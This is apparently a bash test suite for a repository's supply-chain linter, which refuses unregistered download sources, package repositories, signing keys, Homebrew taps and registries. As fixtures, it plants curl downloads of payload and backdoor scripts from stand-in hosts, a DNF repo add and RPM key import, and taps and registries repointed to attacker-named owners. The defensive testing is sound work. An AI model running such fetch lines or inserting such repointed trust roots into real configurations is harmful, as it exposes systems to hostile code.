#!/usr/bin/env bash
set -euo pipefail

# Supply-chain policy (issue #151): the provenance registry, the linter that
# refuses an unregistered network source, and the bounded fetch primitives.

repo_root="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=lib/test.sh
source "$repo_root/tests/lib/test.sh"

test_install_cleanup_trap
test_new_root
test_root="$TEST_ROOT"

# --- The registry and its generated inventory are in step ------------------

python3 "$repo_root/scripts/validate-network-sources.py"
python3 "$repo_root/scripts/render-supply-chain.py" --check
printf 'PASS: the network-source registry validates and its inventory is current\n'

# --- Every plan_add step is read, or the build fails ------------------------

python3 "$repo_root/scripts/validate-plan-network.py"
printf 'PASS: every resolved plan step declares the scripts it runs\n'

# The declaration is what `preflight_plan_network` derives its probe set from,
# so a `plan_add` line the tokeniser cannot read drops out of the check in both
# directions and an undeclared network step passes. A trailing comment is valid
# shell that the runtime `[[ $# -eq 8 ]]` check still accepts, so it is the
# cheapest proof that the validator fails closed rather than skipping the line.
plan_tree="$test_root/plan-tree"
mkdir -p "$plan_tree"
tar -C "$repo_root" --exclude=.git --exclude=.claude -cf - . |
  tar -C "$plan_tree" -xf -
sed -i '/plan_add ai /s/$/  # keep in step order/' \
  "$plan_tree/platforms/fedora/install.sh"
run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$plan_tree"
assert_failure
assert_contains "$TEST_OUTPUT" 'cannot read this plan_add line as a command'
assert_contains "$TEST_OUTPUT" 'platforms/fedora/install.sh:'
printf 'PASS: a plan_add line the tokeniser cannot read is a build error\n'

# A step reaches a script through whatever shell the apply function is written
# in, so the reader has to see the callee wherever it sits. The validator used
# to find "a word in command position" with a regex whose openers were also
# candidates for the word itself, so `if helper; then` reported `if` and `then`
# and never the helper: a script reached that way was never required to be
# declared, and the preflight never probed the host it downloads from.
hidden_tree="$test_root/hidden-call-tree"
mkdir -p "$hidden_tree"
tar -C "$repo_root" --exclude=.git --exclude=.claude -cf - . |
  tar -C "$hidden_tree" -xf -
hide_call_behind() {
  python3 - "$hidden_tree/platforms/fedora/install.sh" "$1" <<'PYTHON'
import pathlib
import sys

installer, wrapping = pathlib.Path(sys.argv[1]), sys.argv[2]
text = installer.read_text(encoding="utf-8")
helper = (
    "fedora_hidden_extra() {\n"
    '  "$DOTFILES_ROOT/platforms/fedora/scripts/install-tailscale.sh"\n'
    "}\n\n"
)
replaced = text.replace(
    "apply_local() { plan_command_run fedora_local_command; }",
    helper + "apply_local() {\n"
    f"  {wrapping}\n"
    "  plan_command_run fedora_local_command\n"
    "}",
    1,
)
if replaced == text:
    raise SystemExit("the apply_local definition this case rewrites is gone")
installer.write_text(replaced, encoding="utf-8")
PYTHON
  bash -n "$hidden_tree/platforms/fedora/install.sh"
  run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$hidden_tree"
  cp "$repo_root/platforms/fedora/install.sh" \
    "$hidden_tree/platforms/fedora/install.sh"
}

hide_call_behind 'if fedora_hidden_extra; then :; fi'
assert_failure
assert_contains "$TEST_OUTPUT" \
  'step local runs platforms/fedora/scripts/install-tailscale.sh but does not declare it'
printf 'PASS: a script reached through `if helper; then` must still be declared\n'

hide_call_behind 'if [[ -n "${DOTFILES_EXTRA:-}" ]]; then fedora_hidden_extra; fi'
assert_failure
assert_contains "$TEST_OUTPUT" \
  'step local runs platforms/fedora/scripts/install-tailscale.sh but does not declare it'
printf 'PASS: a script reached from a one-line if body must still be declared\n'

# Shell the reader cannot parse is unknown, not "declares nothing": an
# unterminated function used to be read as a file with fewer functions in it.
python3 - "$hidden_tree/platforms/fedora/install.sh" <<'PYTHON'
import pathlib
import sys

installer = pathlib.Path(sys.argv[1])
text = installer.read_text(encoding="utf-8")
installer.write_text(
    text.replace(
        "apply_local() { plan_command_run fedora_local_command; }",
        "apply_local() {\n  plan_command_run fedora_local_command\n",
        1,
    ),
    encoding="utf-8",
)
PYTHON
run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$hidden_tree"
assert_failure
assert_contains "$TEST_OUTPUT" 'is never closed'
cp "$repo_root/platforms/fedora/install.sh" "$hidden_tree/platforms/fedora/install.sh"
printf 'PASS: an installer the reader cannot parse is a build error, not a pass\n'

# A step's script reaches the libraries it sources, and the sources those
# libraries fetch from have to name the script as a consumer. The closure used
# to understand three spellings of a source line and skip any other with a
# bare `continue`, so hoisting `$(dirname "${BASH_SOURCE[0]}")` into a variable,
# the most ordinary cleanup there is, emptied it: seven libraries, fetch.sh
# among them, left the preflight's view with lint green (#508, V4-05). The
# control: the containers step calling the RPM Fusion helper must name all
# three packages it downloads.
closure_tree="$test_root/sourced-closure-tree"
mkdir -p "$closure_tree"
tar -C "$repo_root" --exclude=.git --exclude=.claude -cf - . |
  tar -C "$closure_tree" -xf -
containers_step="$closure_tree/platforms/fedora/scripts/install-containers.sh"
respell_sources() {
  python3 - "$containers_step" "$1" <<'PYTHON'
import pathlib
import sys

script, spelling = pathlib.Path(sys.argv[1]), sys.argv[2]
text = pathlib.Path(sys.argv[1]).read_text(encoding="utf-8")
own = 'source "$(dirname "${BASH_SOURCE[0]}")/'
if own not in text or "\ntarget_user=" not in text:
    raise SystemExit("the source lines this case rewrites are gone")
text = text.replace("\ntarget_user=", "\nensure_rpm_fusion_repositories\ntarget_user=", 1)
if spelling == "script_dir":
    text = text.replace(own, 'source "$script_dir/')
    text = text.replace(
        "set -euo pipefail\n",
        'set -euo pipefail\nscript_dir="$(dirname "${BASH_SOURCE[0]}")"\n',
        1,
    )
elif spelling == "script_dir-twice":
    text = text.replace(own, 'source "${script_dir}/')
    text = text.replace(
        "set -euo pipefail\n",
        'set -euo pipefail\nscript_dir="$(dirname "${BASH_SOURCE[0]}")"\n'
        'script_dir="$1"\n',
        1,
    )
elif spelling == "braced-root":
    text = text.replace(own + "../../../", 'source "${DOTFILES_ROOT}/')
    text = text.replace(own + "../", 'source "${DOTFILES_ROOT}/platforms/fedora/')
script.write_text(text, encoding="utf-8")
PYTHON
  bash -n "$containers_step"
  run_capture python3 "$repo_root/scripts/validate-plan-network.py" --root "$closure_tree"
  cp "$repo_root/platforms/fedora/scripts/install-containers.sh" "$containers_step"
}
assert_names_rpm_fusion() {
  assert_failure
  local package
  for package in distribution-gpg-keys rpmfusion-free-release rpmfusion-nonfree-release; do
    assert_contains "$TEST_OUTPUT" \
      "platforms/fedora/scripts/install-containers.sh can fetch $package"
  done
}

respell_sources as-written
assert_names_rpm_fusion
printf 'PASS: a step script that fetches through a sourced library names its sources\n'

respell_sources script_dir
assert_names_rpm_fusion
printf 'PASS: hoisting the script directory into a variable keeps the closure\n'

respell_sources braced-root
assert_names_rpm_fusion
printf 'PASS: ${DOTFILES_ROOT}/ is followed as surely as $DOTFILES_ROOT/\n'

# A source line the reader cannot resolve is a failure naming the line, never
# a library quietly left out: a variable assigned twice could be either value.
respell_sources script_dir-twice
assert_failure
assert_contains "$TEST_OUTPUT" \
  'platforms/fedora/scripts/install-containers.sh:8: cannot tell which file `source "${script_dir}/../../../common/lib/common.sh"` reads'
printf 'PASS: a source line the closure cannot follow is a build error\n'

# Everything the audit named as a trust source is actually registered.
for source_id in terra-repo terra-signing-key rpmfusion-free-release \
  rpmfusion-nonfree-release tailscale-repo mise-release starship-release \
  homebrew-installer homebrew-formulae scoop-installer catppuccin-tmux \
  catppuccin-kde firstmate-repo treehouse-installer no-mistakes-installer \
  npm-registry opam-repository lazyvim-plugins mason-registry \
  mason-registry-crashdummyy validation-image-fedora; do
  awk -F '\t' -v want="$source_id" \
    'NR > 1 && $1 == want { found = 1 } END { exit !found }' \
    "$repo_root/config/network-sources.tsv" || {
    printf 'Network source is not registered: %s\n' "$source_id" >&2
    exit 1
  }
done
printf 'PASS: every audited trust source has a registry entry\n'

# --- The linter fails closed on a new, unregistered source -----------------

fixture_repo="$test_root/fixture-repo"
cp -R "$repo_root" "$fixture_repo" 2>/dev/null || {
  printf 'Could not copy the repository for the linter fixture.\n' >&2
  exit 1
}
rm -rf -- "$fixture_repo/.git"
git -C "$fixture_repo" init -q
git -C "$fixture_repo" config user.name Test
git -C "$fixture_repo" config user.email test@example.invalid
git -C "$fixture_repo" add -A
git -C "$fixture_repo" commit -qm 'Fixture'

lint_fixture() {
  python3 "$fixture_repo/scripts/validate-network-sources.py" 2>&1
}

lint_fixture >/dev/null
printf 'PASS: the copied fixture repository lints clean before it is broken\n'

cat >"$fixture_repo/scripts/unregistered-source.sh" <<'EOF'
#!/usr/bin/env bash
curl --fail --silent https://example.invalid/install.sh --output /tmp/x
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered curl source.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered curl network source'
printf 'PASS: an unregistered curl source fails the linter\n'

cat >"$fixture_repo/scripts/unregistered-source.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: not-a-real-source
curl --fail --silent https://example.invalid/install.sh --output /tmp/x
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unknown network-source id.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unknown network-source id'
rm -f -- "$fixture_repo/scripts/unregistered-source.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unknown network-source id fails the linter\n'

cat >"$fixture_repo/scripts/unregistered-clone.sh" <<'EOF'
#!/usr/bin/env bash
git clone https://example.invalid/thing.git /tmp/thing
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Git clone source.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered git-remote network source'
rm -f -- "$fixture_repo/scripts/unregistered-clone.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unregistered Git clone fails the linter\n'

cat >"$fixture_repo/scripts/unregistered-image.sh" <<'EOF'
#!/usr/bin/env bash
podman run --rm docker.io/library/nonesuch:latest true
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered validation image.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered container-image network source'
rm -f -- "$fixture_repo/scripts/unregistered-image.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unregistered container image fails the linter\n'

# Docker Hub shorthand pulls exactly as much code as the registry-qualified
# form, so leaving the registry out must not leave the gate behind.
cat >"$fixture_repo/scripts/unregistered-shorthand-image.sh" <<'EOF'
#!/usr/bin/env bash
docker pull nonesuch/nonesuch:latest
docker run --rm nonesuch/nonesuch:latest true
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Docker Hub shorthand image.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered container-image network source'
rm -f -- "$fixture_repo/scripts/unregistered-shorthand-image.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an unregistered Docker Hub shorthand image fails the linter\n'

# ... and `owner/name:tag` outside a container context is ordinary text. A
# desktop association reads exactly like an image reference, and flagging one
# would make the linter noise people learn to ignore.
cat >"$fixture_repo/scripts/mentions-associations.sh" <<'EOF'
#!/usr/bin/env bash
associations=("image/jpeg:org.kde.gwenview.desktop" "video/mp4:mpv.desktop")
printf '%s\n' "${associations[@]}"
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/mentions-associations.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an image-shaped string outside a container context needs no annotation\n'

# A clone spelled as an argument vector is the same clone: this is how Lua,
# Python and PowerShell spawn git, and how the Neovim bootstrap does.
cat >"$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/unregistered.lua" <<'EOF'
return {
  setup = function()
    vim.fn.system({ "git", "clone", "https://example.invalid/thing.git", "/tmp/thing" })
  end,
}
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an argv-form clone in a Lua file.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'lua/plugins/unregistered.lua:3'
assert_contains "$lint_output" 'unregistered git-remote network source'
rm -f -- "$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/unregistered.lua"
git -C "$fixture_repo" add -A
printf 'PASS: an argv-form git clone in a Lua file fails the linter\n'

# A presence check or a package-list entry is not an invocation and must not
# require an annotation, or the linter becomes noise people learn to ignore.
cat >"$fixture_repo/scripts/mentions-curl.sh" <<'EOF'
#!/usr/bin/env bash
packages=(bat curl eza)
require_command curl
printf 'curl is required.\n'
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/mentions-curl.sh"
git -C "$fixture_repo" add -A
printf 'PASS: naming curl without invoking it needs no annotation\n'

# Files are selected by what they are, not only by their suffix: an
# extensionless public entry point, a stowed command the role inventory
# classifies, and an asset known only by its shebang are all scanned. Editor
# configuration and a package manifest download as much as an installer does,
# and the library that performs every transfer is held to the rule it exists
# to serve rather than exempted from it.
for scanned_file in doctor bin/.local/bin/theme platforms/fedora/assets/dotfiles-sway \
  nvim-lazyvim/.config/nvim/lua/plugins/mason.lua platforms/macos/Brewfile \
  common/lib/fetch.sh; do
  printf 'curl -fsSL https://example.invalid/x.sh --output /tmp/x\n' \
    >>"$fixture_repo/$scanned_file"
  if lint_output="$(lint_fixture)"; then
    printf 'The linter accepted an unregistered curl source in %s.\n' \
      "$scanned_file" >&2
    exit 1
  fi
  assert_contains "$lint_output" "network sources: $scanned_file:"
  assert_contains "$lint_output" 'unregistered curl network source'
  git -C "$fixture_repo" checkout -q -- "$scanned_file"
done
lint_fixture >/dev/null
printf 'PASS: extensionless and shebang-only scripts are scanned for network sources\n'

# Adding a package repository or a signing key gives the machine a new trust
# root, which is more than a download, so both must be registered too.
trust_root_installer=platforms/fedora/scripts/install-system.sh
cat >>"$fixture_repo/$trust_root_installer" <<'EOF'
sudo dnf config-manager addrepo --from-repofile=https://example.invalid/evil.repo
sudo rpm --import https://example.invalid/key.asc
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered package trust root.\n' >&2
  exit 1
fi
assert_contains "$lint_output" \
  "network sources: $trust_root_installer:"
assert_contains "$lint_output" 'unregistered dnf-addrepo network source'
assert_contains "$lint_output" 'unregistered rpm-key-import network source'
git -C "$fixture_repo" checkout -q -- "$trust_root_installer"
printf 'PASS: an unregistered DNF repository or RPM signing key fails the linter\n'

# An annotation covers the host it names, not whatever construct happens to
# follow it. A download placed under an unrelated one inherits nothing.
cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: homebrew-installer
curl --fail --silent https://example.invalid/install.sh --output /tmp/x
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter let an annotation for one host cover another.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'downloads from example.invalid'
assert_contains "$lint_output" 'homebrew-installer'

# The same annotation over the host it really names is accepted, so the case
# above fails for the host and not merely for being strict.
cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: homebrew-installer
curl --fail --silent \
  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh \
  --output /tmp/x
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/inherited-annotation.sh"
git -C "$fixture_repo" add -A
printf 'PASS: an annotation satisfies only a download from the host it names\n'

# SEC-02. A Homebrew tap is a git clone whose formulae Homebrew runs as Ruby at
# install time, so it is a trust root with its own owner. `Brewfile` has been in
# the validator's SCANNED_NAMES from the start on exactly that reasoning, but
# nothing there could match a line a Brewfile holds, so the entry answered
# nothing and a hostile tap plus two packages from it passed silently.
#
cat >>"$fixture_repo/platforms/macos/Brewfile" <<'EOF'
tap "attacker/evil"
cask "attacker/evil/backdoor"
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Homebrew tap.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'platforms/macos/Brewfile:'
assert_contains "$lint_output" 'unregistered homebrew-tap network source'
assert_contains "$lint_output" 'unregistered homebrew-tap-package network source'
git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
lint_fixture >/dev/null
printf 'PASS: an unregistered Homebrew tap fails the linter\n'

# A tap names no host, so the rule that an annotation covers only what it
# actually names has to read the tap itself. Without it, borrowing the
# annotation of the one tap this repository does use would cover any other.
cat >>"$fixture_repo/platforms/macos/Brewfile" <<'EOF'
# network-source: homebrew-tap-nikitabobko
tap "attacker/evil"
EOF
if lint_output="$(lint_fixture)"; then
  printf "The linter let one tap's annotation cover another.\n" >&2
  exit 1
fi
assert_contains "$lint_output" 'Homebrew tap attacker/evil'
assert_contains "$lint_output" 'https://github.com/attacker/homebrew-evil'
git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
lint_fixture >/dev/null
printf "PASS: a tap is covered only by the source that is that tap\n"

# And the tap this repository does use fails without its own row, so the cases
# above fail for the tap rather than for any `tap` line being rejected.
sed -i '/network-source: homebrew-tap-nikitabobko/d' \
  "$fixture_repo/platforms/macos/Brewfile"
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted the tap without its annotation.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered homebrew-tap network source'
git -C "$fixture_repo" checkout -q -- platforms/macos/Brewfile
lint_fixture >/dev/null
printf 'PASS: the tap this repository does use is covered by its own row\n'

# PS-04. A Mason registry is a trust root of the same kind: every LSP server
# and debug adapter Mason installs is resolved through the configured lists,
# and one of this repository's two is a personal fork. Both were declared in
# the registry already, and nothing detected adding, repointing or losing one.
cat >>"$fixture_repo/common/bootstrap-mason.lua" <<'EOF'

require("mason").setup({
  registries = {
    "github:rogueowner/mason-registry",
  },
})
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Mason registry.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'common/bootstrap-mason.lua:'
assert_contains "$lint_output" 'unregistered package-registry network source'
git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
lint_fixture >/dev/null
printf 'PASS: an unregistered Mason registry fails the linter\n'

# A `github:owner/repo` reference names no host either, so the same rule has
# to read the repository it names. Repointing one of the two declared
# registries keeps its annotation and must still be refused, which is the case
# that matters: a repoint is a one-word edit.
sed -i 's|"github:Crashdummyy/mason-registry"|"github:rogueowner/mason-registry"|' \
  "$fixture_repo/common/bootstrap-mason.lua"
if lint_output="$(lint_fixture)"; then
  printf "The linter let a registry's annotation cover a different one.\n" >&2
  exit 1
fi
assert_contains "$lint_output" 'rogueowner/mason-registry'
assert_contains "$lint_output" 'https://github.com/rogueowner/mason-registry'
git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
lint_fixture >/dev/null
printf 'PASS: a package registry is covered only by the source that is that repository\n'

# And losing the row leaves the declaration behind, which is the direction
# that made the tracked inventory quietly wrong.
sed -i '/^mason-registry-crashdummyy\t/d' "$fixture_repo/config/network-sources.tsv"
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted a declaration whose registry row was deleted.\n' >&2
  exit 1
fi
assert_contains "$lint_output" "unknown network-source id 'mason-registry-crashdummyy'"
git -C "$fixture_repo" checkout -q -- config/network-sources.tsv
lint_fixture >/dev/null
printf 'PASS: deleting a registry row fails the declaration that names it\n'

# A download written as an argument vector rather than a command line. The git
# form was covered and this one was not, so `vim.fn.system({ "curl", ... })`
# in a Lua file reached the network with nothing to flag it.
cat >>"$fixture_repo/nvim-lazyvim/.config/nvim/lua/plugins/dotnet.lua" <<'EOF'

vim.fn.system({ "curl", "-fsSL", "https://example.invalid/payload.sh" })
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an argv-form curl download.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered curl network source'
git -C "$fixture_repo" checkout -q -- nvim-lazyvim/.config/nvim/lua/plugins/dotnet.lua
lint_fixture >/dev/null
printf 'PASS: an argv-form curl download fails the linter\n'

# A PowerShell package verb resolves a name against a configured repository and
# runs what comes back, so the repository is a trust root and the module is
# code. The CI job that installs PSScriptAnalyzer carried its annotation with
# no pattern holding it there, so deleting the annotation changed nothing.
sed -i '/network-source: psscriptanalyzer/d' "$fixture_repo/.github/workflows/validate.yml"
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an Install-Module with its annotation removed.\n' >&2
  exit 1
fi
assert_contains "$lint_output" '.github/workflows/validate.yml:'
assert_contains "$lint_output" 'unregistered powershell-package network source'
git -C "$fixture_repo" checkout -q -- .github/workflows/validate.yml
lint_fixture >/dev/null
printf 'PASS: an unannotated PowerShell package verb fails the linter\n'

# And the other verbs of the same family, in a file that never had one. Its
# name is assembled at run time: spelled out, a path that exists only inside
# this suite would be a dangling reference to scripts/validate-repository-hygiene.py.
scratch_ps1="$(printf 'platforms/windows/%s.ps1' scratch)"
cat >"$fixture_repo/$scratch_ps1" <<'EOF'
Register-PSRepository -Name Private -SourceLocation https://example.invalid/feed
Save-Module -Name Anything -Path C:\tmp
Install-PSResource -Name Anything
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered PowerShell package verb.\n' >&2
  exit 1
fi
assert_contains "$lint_output" "$scratch_ps1:1"
assert_contains "$lint_output" "$scratch_ps1:2"
assert_contains "$lint_output" "$scratch_ps1:3"
rm -f -- "$fixture_repo/$scratch_ps1"
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
printf 'PASS: every PowerShell package verb of the family is flagged\n'

# A Scoop bucket is a git clone of a third-party repository whose manifests
# decide what every `scoop install` fetches and runs. The Windows installer
# passes `$Bucket.Url` to `scoop bucket add`, so the clone's identity lives in
# platforms/windows/manifest.psd1 -- a file nothing scanned, so the two
# registered bucket rows had no line holding them to anything.
cat >>"$fixture_repo/platforms/windows/manifest.psd1" <<'EOF'
@{
    RogueBucket = @{
        Name = 'rogue'
        Url = 'https://github.com/rogueowner/scoop-rogue'
    }
}
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted an unregistered Scoop bucket.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'platforms/windows/manifest.psd1:'
assert_contains "$lint_output" 'unregistered manifest-url network source'
git -C "$fixture_repo" checkout -q -- platforms/windows/manifest.psd1
lint_fixture >/dev/null
printf 'PASS: an unregistered Scoop bucket fails the linter\n'

# github.com serves both buckets and both Mason registries, so the host check
# alone would let any of them cover the others. Repointing a declared bucket
# while keeping its annotation is the edit that matters, and it is a URL
# rather than a whole construct.
sed -i "s|https://github.com/amanthanvi/scoop-noctty|https://github.com/attacker/scoop-noctty|" \
  "$fixture_repo/platforms/windows/manifest.psd1"
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted a repointed Scoop bucket.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'attacker/scoop-noctty'
git -C "$fixture_repo" checkout -q -- platforms/windows/manifest.psd1
lint_fixture >/dev/null
printf 'PASS: a repointed Scoop bucket is not covered by its old annotation\n'

# A shell assignment is not a manifest declaration. Spaces around the `=` are
# what tells them apart, and a shell variable holding a URL is covered by
# whatever construct then fetches it.
cat >"$fixture_repo/scripts/plain-assignment.sh" <<'EOF'
#!/usr/bin/env bash
url='https://example.invalid/path'
printf '%s\n' "$url"
EOF
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
rm -f -- "$fixture_repo/scripts/plain-assignment.sh"
git -C "$fixture_repo" add -A
printf 'PASS: a shell URL assignment is not read as a manifest declaration\n'

# The walk that finds an annotation above a continued construct stops at the
# first line of code, and a list element is not a continuation of the one
# above it. Otherwise a registry appended under an annotated one would inherit
# its provenance, which is what the tap work closed for downloads.
cat >>"$fixture_repo/common/bootstrap-mason.lua" <<'EOF'

require("mason").setup({
  registries = {
    -- network-source: mason-registry
    "github:mason-org/mason-registry",
    "github:rogueowner/mason-registry",
  },
})
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter let a registry inherit the annotation of the one above it.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered package-registry network source'
git -C "$fixture_repo" checkout -q -- common/bootstrap-mason.lua
lint_fixture >/dev/null
printf 'PASS: a registry listed under an annotated one inherits nothing\n'

# An annotation belongs to the construct it introduces, not to whatever is
# written under that one. This is the same file appended to twice: the second
# download inherits nothing from the first one's annotation.
cat >"$fixture_repo/scripts/inherited-annotation.sh" <<'EOF'
#!/usr/bin/env bash
# network-source: homebrew-installer
curl --fail --silent \
  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh \
  --output /tmp/x
curl --fail --silent https://example.invalid/second.sh --output /tmp/y
EOF
git -C "$fixture_repo" add -A
if lint_output="$(lint_fixture)"; then
  printf 'The linter let an annotation cover the download below its own.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'unregistered curl network source'
rm -f -- "$fixture_repo/scripts/inherited-annotation.sh"
git -C "$fixture_repo" add -A
lint_fixture >/dev/null
printf 'PASS: an annotation does not reach past the construct it introduces\n'

# `caller-provided` says the URL comes from the call site. It cannot launder a
# host written into the transfer library itself.
cat >>"$fixture_repo/common/lib/fetch.sh" <<'EOF'

# network-source: caller-provided
curl --fail --silent https://example.invalid/backdoor.sh --output /tmp/x
EOF
if lint_output="$(lint_fixture)"; then
  printf 'The linter accepted a hardcoded URL under caller-provided.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'common/lib/fetch.sh:'
assert_contains "$lint_output" 'downloads from example.invalid'
git -C "$fixture_repo" checkout -q -- common/lib/fetch.sh
lint_fixture >/dev/null
printf 'PASS: caller-provided does not cover a URL hardcoded in the fetch library\n'

# The real call sites are flagged as well: only their annotation passes them.
# The annotation is matched without its comment marker, so a Lua `--` comment
# is deleted like a `#` one.
for annotated in platforms/fedora/lib/tailscale.sh:tailscale-repo:dnf-addrepo \
  platforms/fedora/lib/fedora.sh:terra-signing-key:rpm-key-import \
  common/lib/fetch.sh:caller-provided:curl \
  nvim-lazyvim/.config/nvim/lua/config/lazy.lua:lazy-nvim:git-remote \
  .github/workflows/real-install.yml:parrot-boundary-image:container-image; do
  IFS=: read -r annotated_file annotated_id annotated_label <<<"$annotated"
  sed -i "/network-source: $annotated_id\$/d" "$fixture_repo/$annotated_file"
  if lint_output="$(lint_fixture)"; then
    printf 'The linter accepted %s without its annotation.\n' \
      "$annotated_file" >&2
    exit 1
  fi
  assert_contains "$lint_output" \
    "network sources: $annotated_file:"
  assert_contains "$lint_output" "unregistered $annotated_label network source"
  git -C "$fixture_repo" checkout -q -- "$annotated_file"
done
lint_fixture >/dev/null
printf 'PASS: the real repository and signing-key call sites need their annotations\n'

# --- Tier claims must match the integrity mechanism -------------------------

manifest_fixture="$test_root/network-sources.tsv"
awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "firstmate-repo" { $7 = "immutable-verified" }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted an unverifiable immutable-verified claim.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'claims immutable-verified'
printf 'PASS: an immutable-verified claim without real verification is rejected\n'

awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "catppuccin-tmux" { $8 = "2.3.x" }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a wildcard as an exact pin.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'wildcard'
printf 'PASS: a wildcard is never accepted as an exact pin\n'

# --- Every live source carries a recorded decision (#504) -----------------

# A reviewed-live row is content nothing authenticates before it is used, so it
# is only acceptable as a written decision in config/live-sources.tsv. Each
# case differs from the tracked registries in exactly one way.
live_fixture="$test_root/live-sources.tsv"

# A new live source with no decision.
grep -v '^treehouse-installer	' "$repo_root/config/live-sources.tsv" >"$live_fixture"
if lint_output="$(LIVE_SOURCE_MANIFEST="$live_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a live source with no recorded decision.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'treehouse-installer is reviewed-live, so nothing verifies it before use'
printf 'PASS: a reviewed-live source without a recorded decision is rejected\n'

# A decision left behind after its source was pinned.
awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "treehouse-installer" { $7 = "immutable-verified"; $10 = "sha256-pinned" }
  { print }' "$repo_root/config/network-sources.tsv" >"$manifest_fixture"
if lint_output="$(NETWORK_SOURCE_MANIFEST="$manifest_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a live-source decision for a pinned source.\n' >&2
  exit 1
fi
assert_contains "$lint_output" "treehouse-installer records a live-source decision, but its tier is 'immutable-verified'"
printf 'PASS: a decision for a source that is no longer live is rejected\n'

# A script that claims it is never executed.
awk -F '\t' 'BEGIN { OFS = "\t" }
  NR > 1 && $1 == "treehouse-installer" { $2 = "data"; $3 = "not-executed" }
  { print }' "$repo_root/config/live-sources.tsv" >"$live_fixture"
if lint_output="$(LIVE_SOURCE_MANIFEST="$live_fixture" \
  python3 "$repo_root/scripts/validate-network-sources.py" 2>&1)"; then
  printf 'The linter accepted a remote script recorded as never executed.\n' >&2
  exit 1
fi
assert_contains "$lint_output" 'treehouse-installer is a remote script, so it executes as a script'
printf 'PASS: a remote script cannot be recorded as data that never runs\n'

# Data recorded with a decision only a script can have.
awk -F '\t' 'BEGIN { OFS = "\t" }
